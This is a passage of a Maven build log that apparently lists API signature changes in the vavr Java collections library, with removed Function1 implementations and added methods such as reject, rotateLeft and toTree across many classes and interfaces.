java.util.function.Function\n[INFO]          - method andThen(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method apply(java.lang.Integer)\n[INFO]              - return java.lang.Object\n[INFO]          - method apply(java.lang.Object)\n[INFO]              - access abstract\n[INFO]              - return java.lang.Object\n[INFO]          - method arity()\n[INFO]              - return int\n[INFO]          + method asPartialFunction()\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          - method compose(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method curried()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          - method isMemoized()\n[INFO]              - return boolean\n[INFO]          - method lift()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method memoized()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method partial(java.util.function.Predicate)\n[INFO]              - return io.vavr.PartialFunction\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          - method reversed()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method rotateLeft(int)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method rotateRight(int)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method takeRightUntil(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method takeRightWhile(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]          - method tupled()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method withDefault(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method withDefaultValue(java.lang.Object)\n[INFO]              - return io.vavr.Function1\n[INFO]      > class io.vavr.collection.StreamModule$ConsImpl\n[INFO]          - implements io.vavr.Function1\n[INFO]          - implements io.vavr.Lambda\n[INFO]          - implements java.util.function.Function\n[INFO]          - method andThen(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method apply(java.lang.Integer)\n[INFO]              - return java.lang.Object\n[INFO]          - method apply(java.lang.Object)\n[INFO]              - access abstract\n[INFO]              - return java.lang.Object\n[INFO]          - method arity()\n[INFO]              - return int\n[INFO]          + method asPartialFunction()\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          - method compose(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method curried()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          - method isMemoized()\n[INFO]              - return boolean\n[INFO]          - method lift()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method memoized()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method partial(java.util.function.Predicate)\n[INFO]              - return io.vavr.PartialFunction\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          - method reversed()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method rotateLeft(int)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method rotateRight(int)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method takeRightUntil(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method takeRightWhile(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]          - method tupled()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method withDefault(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method withDefaultValue(java.lang.Object)\n[INFO]              - return io.vavr.Function1\n[INFO]      < class io.vavr.collection.StreamModule$StreamIterator\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Iterator\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      < class io.vavr.collection.TreeMap\n[INFO]          + method collector(java.util.Comparator,java.util.function.Function)\n[INFO]              + access static\n[INFO]              + return java.util.stream.Collector\n[INFO]          + method collector(java.util.Comparator,java.util.function.Function,java.util.function.Function)\n[INFO]              + access static\n[INFO]              + return java.util.stream.Collector\n[INFO]          + method collector(java.util.function.Function)\n[INFO]              + access static\n[INFO]              + return java.util.stream.Collector\n[INFO]          + method collector(java.util.function.Function,java.util.function.Function)\n[INFO]              + access static\n[INFO]              + return java.util.stream.Collector\n[INFO]          + method reject(java.util.function.BiPredicate)\n[INFO]              + return io.vavr.collection.TreeMap\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.TreeMap\n[INFO]          + method rejectKeys(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.TreeMap\n[INFO]          + method rejectValues(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.TreeMap\n[INFO]      > class io.vavr.collection.TreeMultimap\n[INFO]          - implements io.vavr.Function1\n[INFO]          - implements io.vavr.Lambda\n[INFO]          - implements java.util.function.Function\n[INFO]          - method andThen(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method apply(java.lang.Object)\n[INFO]              - return io.vavr.collection.Traversable\n[INFO]          - method arity()\n[INFO]              - return int\n[INFO]          + method asMap()\n[INFO]              + return io.vavr.collection.Map\n[INFO]          + method asPartialFunction()\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          - method compose(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method curried()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          - method isMemoized()\n[INFO]              - return boolean\n[INFO]          - method memoized()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method partial(java.util.function.Predicate)\n[INFO]              - return io.vavr.PartialFunction\n[INFO]          + method reject(java.util.function.BiPredicate)\n[INFO]              + return io.vavr.collection.Multimap\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Multimap\n[INFO]          + method rejectKeys(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Multimap\n[INFO]          + method rejectValues(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Multimap\n[INFO]          - method reversed()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]          - method tupled()\n[INFO]              - return io.vavr.Function1\n[INFO]      < class io.vavr.collection.TreeMultimap$Builder\n[INFO]          + method fill(int,io.vavr.Tuple2)\n[INFO]              + return io.vavr.collection.TreeMultimap\n[INFO]          + method fill(java.util.Comparator,int,io.vavr.Tuple2)\n[INFO]              + return io.vavr.collection.TreeMultimap\n[INFO]      < class io.vavr.collection.TreeSet\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.TreeSet\n[INFO]      < class io.vavr.collection.Vector\n[INFO]          + method fill(int,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return io.vavr.collection.Vector\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Vector\n[INFO]          + method rotateLeft(int)\n[INFO]              + return io.vavr.collection.Vector\n[INFO]          + method rotateRight(int)\n[INFO]              + return io.vavr.collection.Vector\n[INFO]          + method takeRightUntil(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Vector\n[INFO]          + method takeRightWhile(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Vector\n[INFO]      > interface io.vavr.collection.BitSet\n[INFO]          - implements io.vavr.Function1\n[INFO]          - implements io.vavr.Lambda\n[INFO]          - implements java.util.function.Function\n[INFO]          - method andThen(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method apply(java.lang.Object)\n[INFO]              - return java.lang.Boolean\n[INFO]          - method arity()\n[INFO]              - return int\n[INFO]          - method compose(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method curried()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          - method isMemoized()\n[INFO]              - return boolean\n[INFO]          - method memoized()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method partial(java.util.function.Predicate)\n[INFO]              - return io.vavr.PartialFunction\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.BitSet\n[INFO]          - method reversed()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]          - method tupled()\n[INFO]              - return io.vavr.Function1\n[INFO]      > interface io.vavr.collection.IndexedSeq\n[INFO]          - implements io.vavr.Function1\n[INFO]          - implements io.vavr.Lambda\n[INFO]          - implements java.util.function.Function\n[INFO]          - method andThen(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method apply(java.lang.Integer)\n[INFO]              - return java.lang.Object\n[INFO]          - method apply(java.lang.Object)\n[INFO]              - access abstract\n[INFO]              - return java.lang.Object\n[INFO]          - method arity()\n[INFO]              - return int\n[INFO]          + method asPartialFunction()\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          - method compose(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method curried()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          - method isMemoized()\n[INFO]              - return boolean\n[INFO]          - method lift()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method memoized()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method partial(java.util.function.Predicate)\n[INFO]              - return io.vavr.PartialFunction\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.IndexedSeq\n[INFO]          - method reversed()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method rotateLeft(int)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.IndexedSeq\n[INFO]          + method rotateRight(int)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.IndexedSeq\n[INFO]          + method takeRightUntil(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.IndexedSeq\n[INFO]          + method takeRightWhile(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.IndexedSeq\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]          - method tupled()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method withDefault(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method withDefaultValue(java.lang.Object)\n[INFO]              - return io.vavr.Function1\n[INFO]      < interface io.vavr.collection.Iterator\n[INFO]          + method fill(int,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return io.vavr.collection.Iterator\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method iterate(java.util.function.Supplier)\n[INFO]              + access static\n[INFO]              + return io.vavr.collection.Iterator\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Iterator\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      > interface io.vavr.collection.LinearSeq\n[INFO]          - implements io.vavr.Function1\n[INFO]          - implements io.vavr.Lambda\n[INFO]          - implements java.util.function.Function\n[INFO]          - method andThen(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method apply(java.lang.Integer)\n[INFO]              - return java.lang.Object\n[INFO]          - method apply(java.lang.Object)\n[INFO]              - access abstract\n[INFO]              - return java.lang.Object\n[INFO]          - method arity()\n[INFO]              - return int\n[INFO]          + method asPartialFunction()\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          - method compose(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method curried()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          - method isMemoized()\n[INFO]              - return boolean\n[INFO]          - method lift()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method memoized()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method partial(java.util.function.Predicate)\n[INFO]              - return io.vavr.PartialFunction\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.LinearSeq\n[INFO]          - method reversed()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method rotateLeft(int)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.LinearSeq\n[INFO]          + method rotateRight(int)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.LinearSeq\n[INFO]          + method takeRightUntil(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.LinearSeq\n[INFO]          + method takeRightWhile(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.LinearSeq\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]          - method tupled()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method withDefault(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method withDefaultValue(java.lang.Object)\n[INFO]              - return io.vavr.Function1\n[INFO]      > interface io.vavr.collection.List\n[INFO]          - implements io.vavr.Function1\n[INFO]          - implements io.vavr.Lambda\n[INFO]          - implements java.util.function.Function\n[INFO]          - method andThen(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method apply(java.lang.Integer)\n[INFO]              - return java.lang.Object\n[INFO]          - method apply(java.lang.Object)\n[INFO]              - access abstract\n[INFO]              - return java.lang.Object\n[INFO]          - method arity()\n[INFO]              - return int\n[INFO]          + method asPartialFunction()\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          - method compose(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method curried()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method fill(int,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return io.vavr.collection.List\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          - method isMemoized()\n[INFO]              - return boolean\n[INFO]          - method lift()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method memoized()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method partial(java.util.function.Predicate)\n[INFO]              - return io.vavr.PartialFunction\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.List\n[INFO]          - method reversed()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method rotateLeft(int)\n[INFO]              + return io.vavr.collection.List\n[INFO]          + method rotateRight(int)\n[INFO]              + return io.vavr.collection.List\n[INFO]          + method takeRightUntil(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.List\n[INFO]          + method takeRightWhile(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.List\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]          - method tupled()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method withDefault(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method withDefaultValue(java.lang.Object)\n[INFO]              - return io.vavr.Function1\n[INFO]      > interface io.vavr.collection.Map\n[INFO]          - implements io.vavr.Function1\n[INFO]          - implements io.vavr.Lambda\n[INFO]          - implements java.util.function.Function\n[INFO]          - method andThen(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method apply(java.lang.Object)\n[INFO]              - return java.lang.Object\n[INFO]          - method arity()\n[INFO]              - return int\n[INFO]          + method asPartialFunction()\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          - method compose(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method curried()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          - method isMemoized()\n[INFO]              - return boolean\n[INFO]          - method memoized()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method partial(java.util.function.Predicate)\n[INFO]              - return io.vavr.PartialFunction\n[INFO]          + method reject(java.util.function.BiPredicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.Map\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.Map\n[INFO]          + method rejectKeys(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.Map\n[INFO]          + method rejectValues(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.Map\n[INFO]          - method reversed()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]          - method tupled()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method withDefault(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method withDefaultValue(java.lang.Object)\n[INFO]              - return io.vavr.Function1\n[INFO]      > interface io.vavr.collection.Multimap\n[INFO]          - implements io.vavr.Function1\n[INFO]          - implements io.vavr.Lambda\n[INFO]          - implements java.util.function.Function\n[INFO]          - method andThen(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method apply(java.lang.Object)\n[INFO]              - return io.vavr.collection.Traversable\n[INFO]          - method arity()\n[INFO]              - return int\n[INFO]          + method asMap()\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.Map\n[INFO]          + method asPartialFunction()\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          - method compose(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method curried()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          - method isMemoized()\n[INFO]              - return boolean\n[INFO]          - method memoized()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method partial(java.util.function.Predicate)\n[INFO]              - return io.vavr.PartialFunction\n[INFO]          + method reject(java.util.function.BiPredicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.Multimap\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.Multimap\n[INFO]          + method rejectKeys(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.Multimap\n[INFO]          + method rejectValues(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.Multimap\n[INFO]          - method reversed()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]          - method tupled()\n[INFO]              - return io.vavr.Function1\n[INFO]      > interface io.vavr.collection.Seq\n[INFO]          - implements io.vavr.Function1\n[INFO]          - implements io.vavr.Lambda\n[INFO]          - implements java.util.function.Function\n[INFO]          - method andThen(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method apply(java.lang.Integer)\n[INFO]              - return java.lang.Object\n[INFO]          - method apply(java.lang.Object)\n[INFO]              - access abstract\n[INFO]              - return java.lang.Object\n[INFO]          - method arity()\n[INFO]              - return int\n[INFO]          + method asPartialFunction()\n[INFO]              + access abstract\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          - method compose(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method curried()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          - method isMemoized()\n[INFO]              - return boolean\n[INFO]          - method lift()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method memoized()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method partial(java.util.function.Predicate)\n[INFO]              - return io.vavr.PartialFunction\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.Seq\n[INFO]          - method reversed()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method rotateLeft(int)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.Seq\n[INFO]          + method rotateRight(int)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.Seq\n[INFO]          + method takeRightUntil(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.Seq\n[INFO]          + method takeRightWhile(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.Seq\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]          - method tupled()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method withDefault(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method withDefaultValue(java.lang.Object)\n[INFO]              - return io.vavr.Function1\n[INFO]      > interface io.vavr.collection.Set\n[INFO]          - implements io.vavr.Function1\n[INFO]          - implements io.vavr.Lambda\n[INFO]          - implements java.util.function.Function\n[INFO]          - method andThen(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method apply(java.lang.Object)\n[INFO]              - return java.lang.Boolean\n[INFO]          - method arity()\n[INFO]              - return int\n[INFO]          - method compose(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method curried()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          - method isMemoized()\n[INFO]              - return boolean\n[INFO]          - method memoized()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method partial(java.util.function.Predicate)\n[INFO]              - return io.vavr.PartialFunction\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.Set\n[INFO]          - method reversed()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]          - method tupled()\n[INFO]              - return io.vavr.Function1\n[INFO]      > interface io.vavr.collection.SortedMap\n[INFO]          - implements io.vavr.Function1\n[INFO]          - implements io.vavr.Lambda\n[INFO]          - implements java.util.function.Function\n[INFO]          - method andThen(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method apply(java.lang.Object)\n[INFO]              - return java.lang.Object\n[INFO]          - method arity()\n[INFO]              - return int\n[INFO]          + method asPartialFunction()\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          - method compose(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method curried()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          - method isMemoized()\n[INFO]              - return boolean\n[INFO]          - method memoized()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method partial(java.util.function.Predicate)\n[INFO]              - return io.vavr.PartialFunction\n[INFO]          > method put(io.vavr.Tuple2,java.util.function.BiFunction)\n[INFO]              - return io.vavr.collection.Map\n[INFO]              + return io.vavr.collection.SortedMap\n[INFO]          > method put(java.lang.Object,java.lang.Object,java.util.function.BiFunction)\n[INFO]              - return io.vavr.collection.Map\n[INFO]              + return io.vavr.collection.SortedMap\n[INFO]          + method reject(java.util.function.BiPredicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.SortedMap\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.SortedMap\n[INFO]          + method rejectKeys(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.SortedMap\n[INFO]          + method rejectValues(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.SortedMap\n[INFO]          > method replace(java.lang.Object,java.lang.Object,java.lang.Object)\n[INFO]              - return io.vavr.collection.Map\n[INFO]              + return io.vavr.collection.SortedMap\n[INFO]          > method replaceAll(java.util.function.BiFunction)\n[INFO]              - return io.vavr.collection.Map\n[INFO]              + return io.vavr.collection.SortedMap\n[INFO]          > method replaceValue(java.lang.Object,java.lang.Object)\n[INFO]              - return io.vavr.collection.Map\n[INFO]              + return io.vavr.collection.SortedMap\n[INFO]          - method reversed()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]          - method tupled()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method withDefault(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method withDefaultValue(java.lang.Object)\n[INFO]              - return io.vavr.Function1\n[INFO]      > interface io.vavr.collection.SortedMultimap\n[INFO]          - implements io.vavr.Function1\n[INFO]          - implements io.vavr.Lambda\n[INFO]          - implements java.util.function.Function\n[INFO]          - method andThen(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method apply(java.lang.Object)\n[INFO]              - return io.vavr.collection.Traversable\n[INFO]          - method arity()\n[INFO]              - return int\n[INFO]          + method asMap()\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.Map\n[INFO]          + method asPartialFunction()\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          - method compose(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method curried()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          - method isMemoized()\n[INFO]              - return boolean\n[INFO]          - method memoized()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method partial(java.util.function.Predicate)\n[INFO]              - return io.vavr.PartialFunction\n[INFO]          + method reject(java.util.function.BiPredicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.SortedMultimap\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.SortedMultimap\n[INFO]          + method rejectKeys(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.SortedMultimap\n[INFO]          + method rejectValues(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.SortedMultimap\n[INFO]          - method reversed()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]          - method tupled()\n[INFO]              - return io.vavr.Function1\n[INFO]      > interface io.vavr.collection.SortedSet\n[INFO]          - implements io.vavr.Function1\n[INFO]          - implements io.vavr.Lambda\n[INFO]          - implements java.util.function.Function\n[INFO]          - method andThen(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method apply(java.lang.Object)\n[INFO]              - return java.lang.Boolean\n[INFO]          - method arity()\n[INFO]              - return int\n[INFO]          - method compose(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method curried()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          - method isMemoized()\n[INFO]              - return boolean\n[INFO]          - method memoized()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method partial(java.util.function.Predicate)\n[INFO]              - return io.vavr.PartialFunction\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + access abstract\n[INFO]              + return io.vavr.collection.SortedSet\n[INFO]          - method reversed()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]          - method tupled()\n[INFO]              - return io.vavr.Function1\n[INFO]      > interface io.vavr.collection.Stream\n[INFO]          - implements io.vavr.Function1\n[INFO]          - implements io.vavr.Lambda\n[INFO]          - implements java.util.function.Function\n[INFO]          - method andThen(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - 